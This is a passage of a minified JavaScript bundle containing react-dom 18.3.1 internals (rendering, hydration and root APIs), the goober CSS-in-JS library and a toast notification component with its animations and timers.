        if (we(n)) return yd(e, n, t)
    }
    return t
}

function xf(e, t, n, r, o, l, i, s, u) {
    return (e = ku(n, r, !0, e, o, l, i, s, u)).context = wf(null), n = e.current, (l = lt(r = pe(), o = jt(n))).callback = t ?? null, It(n, l, o), e.current.lanes = o, $r(e, o, r), xe(e, r), e
}

function Tl(e, t, n, r) {
    var o = t.current,
        l = pe(),
        i = jt(o);
    return n = wf(n), null === t.context ? t.context = n : t.pendingContext = n, (t = lt(l, i)).payload = {
        element: e
    }, null !== (r = void 0 === r ? null : r) && (t.callback = r), null !== (e = It(o, t, i)) && (We(e, o, i, l), Io(e, o, i)), i
}

function al(e) {
    return (e = e.current).child ? (e.child.tag, e.child.stateNode) : null
}

function Wa(e, t) {
    if (null !== (e = e.memoizedState) && null !== e.dehydrated) {
        var n = e.retryLane;
        e.retryLane = 0 !== n && n < t ? n : t
    }
}

function Cu(e, t) {
    Wa(e, t), (e = e.alternate) && Wa(e, t)
}

function ov() {
    return null
}
gf = function (e, t, n) {
    if (null !== e)
        if (e.memoizedProps !== t.pendingProps || ye.current) ge = !0;
        else {
            if (!(e.lanes & n || 128 & t.flags)) return ge = !1, Vh(e, t, n);
            ge = !!(131072 & e.flags)
        }
    else ge = !1, H && 1048576 & t.flags && xd(t, Zo, t.index);
    switch (t.lanes = 0, t.tag) {
        case 2:
            var r = t.type;
            Oo(e, t), e = t.pendingProps;
            var o = Rn(t, ce.current);
            Pn(t, n), o = fu(null, t, r, e, o, n);
            var l = pu();
            return t.flags |= 1, "object" == typeof o && null !== o && "function" == typeof o.render && void 0 === o.$$typeof ? (t.tag = 1, t.memoizedState = null, t.updateQueue = null, we(r) ? (l = !0, Xo(t)) : l = !1, t.memoizedState = null !== o.state && void 0 !== o.state ? o.state : null, su(t), o.updater = kl, t.stateNode = o, o._reactInternals = t, ls(t, r, e, n), t = us(null, t, r, !0, l, n)) : (t.tag = 0, H && l && eu(t), fe(null, t, o, n), t = t.child), t;
        case 16:
            r = t.elementType;
            e: {
                switch (Oo(e, t), e = t.pendingProps, r = (o = r._init)(r._payload), t.type = r, o = t.tag = tv(r), e = De(r, e), o) {
                    case 0:
                        t = ss(null, t, r, e, n);
                        break e;
                    case 1:
                        t = Oa(null, t, r, e, n);
                        break e;
                    case 11:
                        t = Ra(null, t, r, e, n);
                        break e;
                    case 14:
                        t = ja(null, t, r, De(r.type, e), n);
                        break e
                }
                throw Error(E(306, r, ""))
            }
            return t;
        case 0:
            return r = t.type, o = t.pendingProps, ss(e, t, r, o = t.elementType === r ? o : De(r, o), n);
        case 1:
            return r = t.type, o = t.pendingProps, Oa(e, t, r, o = t.elementType === r ? o : De(r, o), n);
        case 3:
            e: {
                if (qd(t), null === e) throw Error(E(387)); r = t.pendingProps,
                    o = (l = t.memoizedState).element,
                    Nd(e, t),
                    tl(t, r, null, n);
                var i = t.memoizedState;
                if (r = i.element, l.isDehydrated) {
                    if (l = {
                        element: r,
                        isDehydrated: !1,
                        cache: i.cache,
                        pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
                        transitions: i.transitions
                    }, t.updateQueue.baseState = l, t.memoizedState = l, 256 & t.flags) {
                        t = za(e, t, r, n, o = Ln(Error(E(423)), t));
                        break e
                    }
                    if (r !== o) {
                        t = za(e, t, r, n, o = Ln(Error(E(424)), t));
                        break e
                    }
                    for (Ee = Tt(t.stateNode.containerInfo.firstChild), Ce = t, H = !0, Ve = null, n = kd(t, null, r, n), t.child = n; n;) n.flags = -3 & n.flags | 4096, n = n.sibling
                } else {
                    if (jn(), r === o) {
                        t = ct(e, t, n);
                        break e
                    }
                    fe(e, t, r, n)
                }
                t = t.child
            }
            return t;
        case 5:
            return Pd(t), null === e && ns(t), r = t.type, o = t.pendingProps, l = null !== e ? e.memoizedProps : null, i = o.children, Ji(r, o) ? i = null : null !== l && Ji(r, l) && (t.flags |= 32), Zd(e, t), fe(e, t, i, n), t.child;
        case 6:
            return null === e && ns(t), null;
        case 13:
            return ef(e, t, n);
        case 4:
            return uu(t, t.stateNode.containerInfo), r = t.pendingProps, null === e ? t.child = On(t, null, r, n) : fe(e, t, r, n), t.child;
        case 11:
            return r = t.type, o = t.pendingProps, Ra(e, t, r, o = t.elementType === r ? o : De(r, o), n);
        case 7:
            return fe(e, t, t.pendingProps, n), t.child;
        case 8:
        case 12:
            return fe(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e: {
                if (r = t.type._context, o = t.pendingProps, l = t.memoizedProps, i = o.value, V(qo, r._currentValue), r._currentValue = i, null !== l)
                    if (He(l.value, i)) {
                        if (l.children === o.children && !ye.current) {
                            t = ct(e, t, n);
                            break e
                        }
                    } else
                        for (null !== (l = t.child) && (l.return = t); null !== l;) {
                            var s = l.dependencies;
                            if (null !== s) {
                                i = l.child;
                                for (var u = s.firstContext; null !== u;) {
                                    if (u.context === r) {
                                        if (1 === l.tag) {
                                            (u = lt(-1, n & -n)).tag = 2;
                                            var a = l.updateQueue;
                                            if (null !== a) {
                                                var c = (a = a.shared).pending;
                                                null === c ? u.next = u : (u.next = c.next, c.next = u), a.pending = u
                                            }
                                        }
                                        l.lanes |= n, null !== (u = l.alternate) && (u.lanes |= n), rs(l.return, n, t), s.lanes |= n;
                                        break
                                    }
                                    u = u.next
                                }
                            } else if (10 === l.tag) i = l.type === t.type ? null : l.child;
                            else if (18 === l.tag) {
                                if (null === (i = l.return)) throw Error(E(341));
                                i.lanes |= n, null !== (s = i.alternate) && (s.lanes |= n), rs(i, n, t), i = l.sibling
                            } else i = l.child;
                            if (null !== i) i.return = l;
                            else
                                for (i = l; null !== i;) {
                                    if (i === t) {
                                        i = null;
                                        break
                                    }
                                    if (null !== (l = i.sibling)) {
                                        l.return = i.return, i = l;
                                        break
                                    }
                                    i = i.return
                                }
                            l = i
                        }
                fe(e, t, o.children, n),
                    t = t.child
            }
            return t;
        case 9:
            return o = t.type, r = t.pendingProps.children, Pn(t, n), r = r(o = Me(o)), t.flags |= 1, fe(e, t, r, n), t.child;
        case 14:
            return o = De(r = t.type, t.pendingProps), ja(e, t, r, o = De(r.type, o), n);
        case 15:
            return Xd(e, t, t.type, t.pendingProps, n);
        case 17:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : De(r, o), Oo(e, t), t.tag = 1, we(r) ? (e = !0, Xo(t)) : e = !1, Pn(t, n), Kd(t, r, o), ls(t, r, o, n), us(null, t, r, !0, e, n);
        case 19:
            return tf(e, t, n);
        case 22:
            return Jd(e, t, n)
    }
    throw Error(E(156, t.tag))
};
var Sf = "function" == typeof reportError ? reportError : function (e) {
    console.error(e)
};

function Nu(e) {
    this._internalRoot = e
}

function Il(e) {
    this._internalRoot = e
}

function Pu(e) {
    return !(!e || 1 !== e.nodeType && 9 !== e.nodeType && 11 !== e.nodeType)
}

function Rl(e) {
    return !(!e || 1 !== e.nodeType && 9 !== e.nodeType && 11 !== e.nodeType && (8 !== e.nodeType || " react-mount-point-unstable " !== e.nodeValue))
}

function Ha() { }

function lv(e, t, n, r, o) {
    if (o) {
        if ("function" == typeof r) {
            var l = r;
            r = function () {
                var a = al(i);
                l.call(a)
            }
        }
        var i = xf(t, r, e, 0, null, !1, !1, "", Ha);
        return e._reactRootContainer = i, e[ut] = i.current, _r(8 === e.nodeType ? e.parentNode : e), tn(), i
    }
    for (; o = e.lastChild;) e.removeChild(o);
    if ("function" == typeof r) {
        var s = r;
        r = function () {
            var a = al(u);
            s.call(a)
        }
    }
    var u = ku(e, 0, !1, null, null, !1, !1, "", Ha);
    return e._reactRootContainer = u, e[ut] = u.current, _r(8 === e.nodeType ? e.parentNode : e), tn((function () {
        Tl(t, u, n, r)
    })), u
}

function jl(e, t, n, r, o) {
    var l = n._reactRootContainer;
    if (l) {
        var i = l;
        if ("function" == typeof o) {
            var s = o;
            o = function () {
                var u = al(i);
                s.call(u)
            }
        }
        Tl(t, i, e, o)
    } else i = lv(n, t, e, o, r);
    return al(i)
}
Il.prototype.render = Nu.prototype.render = function (e) {
    var t = this._internalRoot;
    if (null === t) throw Error(E(409));
    Tl(e, t, null, null)
}, Il.prototype.unmount = Nu.prototype.unmount = function () {
    var e = this._internalRoot;
    if (null !== e) {
        this._internalRoot = null;
        var t = e.containerInfo;
        tn((function () {
            Tl(null, e, null, null)
        })), t[ut] = null
    }
}, Il.prototype.unstable_scheduleHydration = function (e) {
    if (e) {
        var t = Jc();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < xt.length && 0 !== t && t < xt[n].priority; n++);
        xt.splice(n, 0, e), 0 === n && qc(e)
    }
}, Yc = function (e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = tr(t.pendingLanes);
                0 !== n && (Gs(t, 1 | n), xe(t, X()), !(6 & M) && (Mn = X() + 500, Dt()))
            }
            break;
        case 13:
            tn((function () {
                var r = at(e, 1);
                if (null !== r) {
                    var o = pe();
                    We(r, e, 1, o)
                }
            })), Cu(e, 1)
    }
}, Ks = function (e) {
    if (13 === e.tag) {
        var t = at(e, 134217728);
        if (null !== t) We(t, e, 134217728, pe());
        Cu(e, 134217728)
    }
}, Xc = function (e) {
    if (13 === e.tag) {
        var t = jt(e),
            n = at(e, t);
        if (null !== n) We(n, e, t, pe());
        Cu(e, t)
    }
}, Jc = function () {
    return $
}, Zc = function (e, t) {
    var n = $;
    try {
        return $ = e, t()
    } finally {
        $ = n
    }
}, Ui = function (e, t, n) {
    switch (t) {
        case "input":
            if (Li(e, n), t = n.name, "radio" === n.type && null != t) {
                for (n = e; n.parentNode;) n = n.parentNode;
                for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var o = Sl(r);
                        if (!o) throw Error(E(90));
                        Ic(r), Li(r, o)
                    }
                }
            }
            break;
        case "textarea":
            jc(e, n);
            break;
        case "select":
            null != (t = n.value) && En(e, !!n.multiple, t, !1)
    }
}, Dc = xu, Fc = tn;
var iv = {
    usingClientEntryPoint: !1,
    Events: [Fr, vn, Sl, Ac, $c, xu]
},
    Xn = {
        findFiberByHostInstance: Bt,
        bundleType: 0,
        version: "18.3.1",
        rendererPackageName: "react-dom"
    },
    sv = {
        bundleType: Xn.bundleType,
        version: Xn.version,
        rendererPackageName: Xn.rendererPackageName,
        rendererConfig: Xn.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: pt.ReactCurrentDispatcher,
        findHostInstanceByFiber: function (e) {
            return null === (e = bc(e)) ? null : e.stateNode
        },
        findFiberByHostInstance: Xn.findFiberByHostInstance || ov,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var ho = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!ho.isDisabled && ho.supportsFiber) try {
        gl = ho.inject(sv), Je = ho
    } catch { }
}

function _f() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || "function" != typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE)) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(_f)
    } catch (e) {
        console.error(e)
    }
}
Ie.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = iv, Ie.createPortal = function (e, t) {
    var n = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : null;
    if (!Pu(t)) throw Error(E(200));
    return rv(e, t, null, n)
}, Ie.createRoot = function (e, t) {
    if (!Pu(e)) throw Error(E(299));
    var n = !1,
        r = "",
        o = Sf;
    return null != t && (!0 === t.unstable_strictMode && (n = !0), void 0 !== t.identifierPrefix && (r = t.identifierPrefix), void 0 !== t.onRecoverableError && (o = t.onRecoverableError)), t = ku(e, 1, !1, null, null, n, !1, r, o), e[ut] = t.current, _r(8 === e.nodeType ? e.parentNode : e), new Nu(t)
}, Ie.findDOMNode = function (e) {
    if (null == e) return null;
    if (1 === e.nodeType) return e;
    var t = e._reactInternals;
    if (void 0 === t) throw "function" == typeof e.render ? Error(E(188)) : (e = Object.keys(e).join(","), Error(E(268, e)));
    return e = null === (e = bc(t)) ? null : e.stateNode
}, Ie.flushSync = function (e) {
    return tn(e)
}, Ie.hydrate = function (e, t, n) {
    if (!Rl(t)) throw Error(E(200));
    return jl(null, e, t, !0, n)
}, Ie.hydrateRoot = function (e, t, n) {
    if (!Pu(e)) throw Error(E(405));
    var r = null != n && n.hydratedSources || null,
        o = !1,
        l = "",
        i = Sf;
    if (null != n && (!0 === n.unstable_strictMode && (o = !0), void 0 !== n.identifierPrefix && (l = n.identifierPrefix), void 0 !== n.onRecoverableError && (i = n.onRecoverableError)), t = xf(t, null, e, 1, n ?? null, o, !1, l, i), e[ut] = t.current, _r(e), r)
        for (e = 0; e < r.length; e++) o = (o = (n = r[e])._getVersion)(n._source), null == t.mutableSourceEagerHydrationData ? t.mutableSourceEagerHydrationData = [n, o] : t.mutableSourceEagerHydrationData.push(n, o);
    return new Il(t)
}, Ie.render = function (e, t, n) {
    if (!Rl(t)) throw Error(E(200));
    return jl(null, e, t, !1, n)
}, Ie.unmountComponentAtNode = function (e) {
    if (!Rl(e)) throw Error(E(40));
    return !!e._reactRootContainer && (tn((function () {
        jl(null, null, e, !1, (function () {
            e._reactRootContainer = null, e[ut] = null
        }))
    })), !0)
}, Ie.unstable_batchedUpdates = xu, Ie.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
    if (!Rl(n)) throw Error(E(200));
    if (null == e || void 0 === e._reactInternals) throw Error(E(38));
    return jl(e, t, n, !1, r)
}, Ie.version = "18.3.1-next-f1338f8080-20240426", _f(), Sc.exports = Ie;
var Ef = Sc.exports,
    Ba = Ef;
Pi.createRoot = Ba.createRoot, Pi.hydrateRoot = Ba.hydrateRoot;
let Cf, xs, Ss, uv = {
    data: ""
},
    av = e => "object" == typeof window ? ((e ? e.querySelector("#_goober") : window._goober) || Object.assign((e || document.head).appendChild(document.createElement("style")), {
        innerHTML: " ",
        id: "_goober"
    })).firstChild : e || uv,
    cv = /(?:([\u0080-\uFFFF\w-%@]+) *:? *([^{;]+?);|([^;}{]*?) *{)|(}\s*)/g,
    dv = /\/\*[^]*?\*\/|  +/g,
    Ga = /\n+/g,
    _t = (e, t) => {
        let n = "",
            r = "",
            o = "";
        for (let l in e) {
            let i = e[l];
            "@" == l[0] ? "i" == l[1] ? n = l + " " + i + ";" : r += "f" == l[1] ? _t(i, l) : l + "{" + _t(i, "k" == l[1] ? "" : t) + "}" : "object" == typeof i ? r += _t(i, t ? t.replace(/([^,])+/g, (s => l.replace(/(^:.*)|([^,])+/g, (u => /&/.test(u) ? u.replace(/&/g, s) : s ? s + " " + u : u)))) : l) : null != i && (l = /^--/.test(l) ? l : l.replace(/[A-Z]/g, "-$&").toLowerCase(), o += _t.p ? _t.p(l, i) : l + ":" + i + ";")
        }
        return n + (t && o ? t + "{" + o + "}" : o) + r
    },
    qe = {},
    kf = e => {
        if ("object" == typeof e) {
            let t = "";
            for (let n in e) t += n + kf(e[n]);
            return t
        }
        return e
    },
    fv = (e, t, n, r, o) => {
        let l = kf(e),
            i = qe[l] || (qe[l] = (u => {
                let a = 0,
                    c = 11;
                for (; a < u.length;) c = 101 * c + u.charCodeAt(a++) >>> 0;
                return "go" + c
            })(l));
        if (!qe[i]) {
            let u = l !== e ? e : (a => {
                let c, p, m = [{}];
                for (; c = cv.exec(a.replace(dv, ""));) c[4] ? m.shift() : c[3] ? (p = c[3].replace(Ga, " ").trim(), m.unshift(m[0][p] = m[0][p] || {})) : m[0][c[1]] = c[2].replace(Ga, " ").trim();
                return m[0]
            })(e);
            qe[i] = _t(o ? {
                ["@keyframes " + i]: u
            } : u, n ? "" : "." + i)
        }
        let s = n && qe.g ? qe.g : null;
        return n && (qe.g = qe[i]), u = qe[i], a = t, c = r, (p = s) ? a.data = a.data.replace(p, u) : -1 === a.data.indexOf(u) && (a.data = c ? u + a.data : a.data + u), i;
        var u, a, c, p
    },
    pv = (e, t, n) => e.reduce(((r, o, l) => {
        let i = t[l];
        if (i && i.call) {
            let s = i(n),
                u = s && s.props && s.props.className || /^go/.test(s) && s;
            i = u ? "." + u : s && "object" == typeof s ? s.props ? "" : _t(s, "") : !1 === s ? "" : s
        }
        return r + o + (i ?? "")
    }), "");

function Ol(e) {
    let t = this || {},
        n = e.call ? e(t.p) : e;
    return fv(n.unshift ? n.raw ? pv(n, [].slice.call(arguments, 1), t.p) : n.reduce(((r, o) => Object.assign(r, o && o.call ? o(t.p) : o)), {}) : n, av(t.target), t.g, t.o, t.k)
}
Ol.bind({
    g: 1
});
let dt = Ol.bind({
    k: 1
});

function mv(e, t, n, r) {
    _t.p = t, Cf = e, xs = n, Ss = r
}

function Ft(e, t) {
    let n = this || {};
    return function () {
        let r = arguments;
        return function o(l, i) {
            let s = Object.assign({}, l),
                u = s.className || o.className;
            n.p = Object.assign({
                theme: xs && xs()
            }, s), n.o = / *go\d+/.test(u), s.className = Ol.apply(n, r) + (u ? " " + u : "");
            let a = e;
            return e[0] && (a = s.as || e, delete s.as), Ss && a[0] && Ss(s), Cf(a, s)
        }
    }
}
var hv = e => "function" == typeof e,
    cl = (e, t) => hv(e) ? e(t) : e,
    vv = (() => {
        let e = 0;
        return () => (++e).toString()
    })(),
    Nf = (() => {
        let e;
        return () => {
            if (void 0 === e && typeof window < "u") {
                let t = matchMedia("(prefers-reduced-motion: reduce)");
                e = !t || t.matches
            }
            return e
        }
    })(),
    gv = 20,
    Ao = new Map,
    yv = 1e3,
    Ka = e => {
        if (Ao.has(e)) return;
        let t = setTimeout((() => {
            Ao.delete(e), sn({
                type: 4,
                toastId: e
            })
        }), yv);
        Ao.set(e, t)
    },
    wv = e => {
        let t = Ao.get(e);
        t && clearTimeout(t)
    },
    _s = (e, t) => {
        switch (t.type) {
            case 0:
                return {
                    ...e, toasts: [t.toast, ...e.toasts].slice(0, gv)
                };
            case 1:
                return t.toast.id && wv(t.toast.id), {
                    ...e,
                    toasts: e.toasts.map((l => l.id === t.toast.id ? {
                        ...l,
                        ...t.toast
                    } : l))
                };
            case 2:
                let {
                    toast: n
                } = t;
                return e.toasts.find((l => l.id === n.id)) ? _s(e, {
                    type: 1,
                    toast: n
                }) : _s(e, {
                    type: 0,
                    toast: n
                });
            case 3:
                let {
                    toastId: r
                } = t;
                return r ? Ka(r) : e.toasts.forEach((l => {
                    Ka(l.id)
                })), {
                    ...e,
                    toasts: e.toasts.map((l => l.id === r || void 0 === r ? {
                        ...l,
                        visible: !1
                    } : l))
                };
            case 4:
                return void 0 === t.toastId ? {
                    ...e,
                    toasts: []
                } : {
                    ...e,
                    toasts: e.toasts.filter((l => l.id !== t.toastId))
                };
            case 5:
                return {
                    ...e, pausedAt: t.time
                };
            case 6:
                let o = t.time - (e.pausedAt || 0);
                return {
                    ...e, pausedAt: void 0, toasts: e.toasts.map((l => ({
                        ...l,
                        pauseDuration: l.pauseDuration + o
                    })))
                }
        }
    },
    $o = [],
    Do = {
        toasts: [],
        pausedAt: void 0
    },
    sn = e => {
        Do = _s(Do, e), $o.forEach((t => {
            t(Do)
        }))
    },
    xv = {
        blank: 4e3,
        error: 4e3,
        success: 2e3,
        loading: 1 / 0,
        custom: 4e3
    },
    Sv = (e = {}) => {
        let [t, n] = x.useState(Do);
        x.useEffect((() => ($o.push(n), () => {
            let o = $o.indexOf(n);
            o > -1 && $o.splice(o, 1)
        })), [t]);
        let r = t.toasts.map((o => {
            var l, i;
            return {
                ...e,
                ...e[o.type],
                ...o,
                duration: o.duration || (null == (l = e[o.type]) ? void 0 : l.duration) || (null == e ? void 0 : e.duration) || xv[o.type],
                style: {
                    ...e.style,
                    ...null == (i = e[o.type]) ? void 0 : i.style,
                    ...o.style
                }
            }
        }));
        return {
            ...t,
            toasts: r
        }
    },
    _v = (e, t = "blank", n) => ({
        createdAt: Date.now(),
        visible: !0,
        type: t,
        ariaProps: {
            role: "status",
            "aria-live": "polite"
        },
        message: e,
        pauseDuration: 0,
        ...n,
        id: (null == n ? void 0 : n.id) || vv()
    }),
    Ur = e => (t, n) => {
        let r = _v(t, e, n);
        return sn({
            type: 2,
            toast: r
        }), r.id
    },
    ke = (e, t) => Ur("blank")(e, t);
ke.error = Ur("error"), ke.success = Ur("success"), ke.loading = Ur("loading"), ke.custom = Ur("custom"), ke.dismiss = e => {
    sn({
        type: 3,
        toastId: e
    })
}, ke.remove = e => sn({
    type: 4,
    toastId: e
}), ke.promise = (e, t, n) => {
    let r = ke.loading(t.loading, {
        ...n,
        ...null == n ? void 0 : n.loading
    });
    return e.then((o => (ke.success(cl(t.success, o), {
        id: r,
        ...n,
        ...null == n ? void 0 : n.success
    }), o))).catch((o => {
        ke.error(cl(t.error, o), {
            id: r,
            ...n,
            ...null == n ? void 0 : n.error
        })
    })), e
};
var Ev = (e, t) => {
    sn({
        type: 1,
        toast: {
            id: e,
            height: t
        }
    })
},
    kv = () => {
        sn({
            type: 5,
            time: Date.now()
        })
    },
    Cv = e => {
        let {
            toasts: t,
            pausedAt: n
        } = Sv(e);
        x.useEffect((() => {
            if (n) return;
            let l = Date.now(),
                i = t.map((s => {
                    if (s.duration === 1 / 0) return;
                    let u = (s.duration || 0) + s.pauseDuration - (l - s.createdAt);
                    if (!(u < 0)) return setTimeout((() => ke.dismiss(s.id)), u);
                    s.visible && ke.dismiss(s.id)
                }));
            return () => {
                i.forEach((s => s && clearTimeout(s)))
            }
        }), [t, n]);
        let r = x.useCallback((() => {
            n && sn({
                type: 6,
                time: Date.now()
            })
        }), [n]),
            o = x.useCallback(((l, i) => {
                let {
                    reverseOrder: s = !1,
                    gutter: u = 8,
                    defaultPosition: a
                } = i || {}, c = t.filter((g => (g.position || a) === (l.position || a) && g.height)), p = c.findIndex((g => g.id === l.id)), m = c.filter(((g, w) => w < p && g.visible)).length;
                return c.filter((g => g.visible)).slice(...s ? [m + 1] : [0, m]).reduce(((g, w) => g + (w.height || 0) + u), 0)
            }), [t]);
        return {
            toasts: t,
            handlers: {
                updateHeight: Ev,
                startPause: kv,
                endPause: r,
                calculateOffset: o
            }
        }
    },
    Nv = dt`
 from {
  transform: scale(0) rotate(45deg);
  opacity: 0;
 }
 to {
 transform: scale(1) rotate(45deg);
  opacity: 1;
 }`,
    Pv = dt`
 from {
  transform: scale(0);
  opacity: 0;
 }
 to {
  transform: scale(1);
  opacity: 1;
 }`,
    Tv = dt`
 from {
  transform: scale(0) rotate(90deg);
  opacity: 0;
 }
 to {
  transform: scale(1) rotate(90deg);
  opacity: 1;
 }`,
    Iv = Ft("div")`
  width: 20px;
  opacity: 0;
  height: 20px;
  border-radius: 10px;
  background: ${e => e.primary || "#ff4b4b"};
  position: relative;
  transform: rotate(45deg);
 
  animation: ${Nv} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
  animation-delay: 100ms;
 
  &:after,
  &:before {
    content: '';
    animation: ${Pv} 0.15s ease-out forwards;
    animation-delay: 150ms;
    position: absolute;
    border-radius: 3px;
    opacity: 0;
    background: ${e => e.secondary || "#fff"};
    bottom: 9px;
    left: 4px;
    height: 2px;
    width: 12px;
  }
 
  &:before {
    animation: ${Tv} 0.15s ease-out forwards;
    animation-delay: 180ms;
    transform: rotate(90deg);
  }
 `,
    Rv = dt`
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
 `,
    jv = Ft("div")`
  width: 12px;
  height: 12px;
  box-sizing: border-box;
  border: 2px solid;
  border-radius: 100%;
  border-color: ${e => e.secondary || "#e0e0e0"};
  border-right-color: ${e => e.primary || "#616161"};
  animation: ${Rv} 1s linear infinite;
 `,
    Ov = dt`
 from {
  transform: scale(0) rotate(45deg);
  opacity: 0;
 }
 to {
  transform: scale(1) rotate(45deg);
  opacity: 1;
 }`,
    zv = dt`
 0% {
  height: 0;
  width: 0;
  opacity: 0;
 }
 40% {
  height: 0;
  width: 6px;
  opacity: 1;
 }
 100% {
  opacity: 1;
  height: 10px;
 }`,
    Lv = Ft("div")`
  width: 20px;
  opacity: 0;
  height: 20px;
  border-radius: 10px;
  background: ${e => e.primary || "#61d345"};
  position: relative;
  transform: rotate(45deg);
 
  animation: ${Ov} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
  animation-delay: 100ms;
  &:after {
    content: '';
    box-sizing: border-box;
    animation: ${zv} 0.2s ease-out forwards;
    opacity: 0;
    animation-delay: 200ms;
    position: absolute;
    border-right: 2px solid;
    border-bottom: 2px solid;
    border-color: ${e => e.secondary || "#fff"};
    bottom: 6px;
    left: 6px;
    height: 10px;
    width: 6px;
  }
 `,
    Mv = Ft("div")`
  position: absolute;
 `,
    Av = Ft("div")`
  position: relative;
  display: flex;
  justify-content: center;
  align-items: center;
  min-width: 20px;
  min-height: 20px;
 `,
    $v = dt`
 from {
  transform: scale(0.6);
  opacity: 0.4;
 }
 to {
  transform: scale(1);
  opacity: 1;
 }`,
    Dv = Ft("div")`
  position: relative;
  transform: scale(0.6);
  opacity: 0.4;
  min-width: 20px;
  animation: ${$v} 0.3s 0.12s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
 `,
    Fv = ({
        toast: e
    }) => {
        let {
            icon: t,
            type: n,
            iconTheme: r
        } = e;
        return void 0 !== t ? "string" == typeof t ? x.createElement(Dv, null, t) : t : "blank" === n ? null : x.createElement(Av, null, x.createElement(jv, {
            ...r
        }), "loading" !== n && x.createElement(Mv, null, "error" === n ? x.createElement(Iv, {
            ...r
        }) : x.createElement(Lv, {
            ...r
        })))
    },
    Vv = e => `\n0% {transform: translate3d(0,${-200 * e}%,0) scale(.6); opacity:.5;}\n100% {transform: translate3d(0,0,0) scale(1); opacity:1;}\n`,
    Uv = e => `\n0% {transform: translate3d(0,0,-1px) scale(1); opacity:1;}\n100% {transform: translate3d(0,${-150 * e}%,-1px) scale(.6); opacity:0;}\n`,
    bv = "0%{opacity:0;} 100%{opacity:1;}",
    Wv = "0%{opacity:1;} 100%{opacity:0;}",
    Hv = Ft("div")`
  display: flex;
  align-items: center;
  background: #fff;
  color: #363636;
  line-height: 1.3;
  will-change: transform;
  box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1), 0 3px 3px rgba(0, 0, 0, 0.05);
  max-width: 350px;
  pointer-events: auto;
  padding: 8px 10px;
  border-radius: 8px;
 `,
    Bv = Ft("div")`
  display: flex;
  justify-content: center;
  margin: 4px 10px;
  color: inherit;
  flex: 1 1 auto;
  white-space: pre-line;
 `,
    Gv = (e, t) => {
        let n = e.includes("top") ? 1 : -1,
            [r, o] = Nf() ? [bv, Wv] : [Vv(n), Uv(n)];
        return {
            animation: t ? `${dt(r)} 0.35s cubic-bezier(.21,1.02,.73,1) forwards` : `${dt(o)} 0.4s forwards cubic-bezier(.06,.71,.55,1)`
        }
    },
    Kv = x.memo((({
        toast: e,
        position: t,
        style: n,
        children: r
    }) => {
        let o = e.height ? Gv(e.position || t || "top-center", e.visible) : {
            opacity: 0
        },
            l = x.createElement(Fv, {
                toast: e
            }),
            i = x.createElement(Bv, {
                ...e.ariaProps
            }, cl(e.message, e));
        return x.createElement(Hv, {
            className: e.className,
            style: {
                ...o,
                ...n,
                ...e.style
            }
        }, "function" == typeof r ? r({
            icon: l,
            message: i
        }) : x.createElement(x.Fragment, null, l, i))
    }));
mv(x.createElement);
var Qv = ({
    id: e,
    className: t,
    style: n,
    onHeightUpdate: r,
    children: o
}) => {
    let l = x.useCallback((i => {
        if (i) {
            let s = () => {
                let u = i.getBoundingClientRect().height;
                r(e, u)
            };
            s(), new MutationObserver(s).observe(i, {
                subtree: !0,
                childList: !0,
                characterData: !0
            })
        }
    }), [e, r]);
    return x.createElement("div", {
        ref: l,
        className: t,
        style: n
    }, o)
},
    Yv = (e, t) => {
        let n = e.includes("top"),
            r = n ? {
                top: 0
            } : {
                bottom: 0
            },
            o = e.includes("center") ? {
                justifyContent: "center"
            } : e.includes("right") ? {
                justifyContent: "flex-end"
            } : {};
        return {
            left: 0,
            right: 0,
            display: "flex",
            position: "absolute",
            transition: Nf() ? void 0 : "all 230ms cubic-bezier(.21,1.02,.73,1)",
            transform: `translateY(${t * (n ? 1 : -1)}px)`,
            ...r,
            ...o
        }
    },
    Xv = Ol`
  z-index: 9999;
  > * {
    pointer-events: auto;
  }
 `,
    vo = 16,
    Jv = ({
        reverseOrder: e,
        position: t = "top-center",
        toastOptions: n,
        gutter: r,
        children: o,
        containerStyle: l,
        containerClassName: i
    }) => {
        let {
            toasts: s,
            handlers: u
        } = Cv(n);
        return x.createElement("div", {
            style: {
                position: "fixed",
                zIndex: 9999,
                top: vo,
                left: vo,
                right: vo,
                bottom: vo,
                pointerEvents: "none",
                ...l
            },
            className: i,
            onMouseEnter: u.startPause,
            onMouseLeave: u.endPause
        }, s.map((a => {
            let c = a.position || t,
                p = u.calculateOffset(a, {
                    reverseOrder: e,
                    gutter: r,
                    defaultPosition: t
                }),
                m = Yv(c, p);
            return x.createElement(Qv, {
                id: a.id,
                key: a.id,
                onHeightUpdate: u.updateHeight,
                className: a.visible ? Xv : "",
                style: m
            }, "custom" === a.type ? cl(a.message, a) : o ? o(a) : x.createElement(Kv, {
                toast: a,
                position: c
            }))
        })))
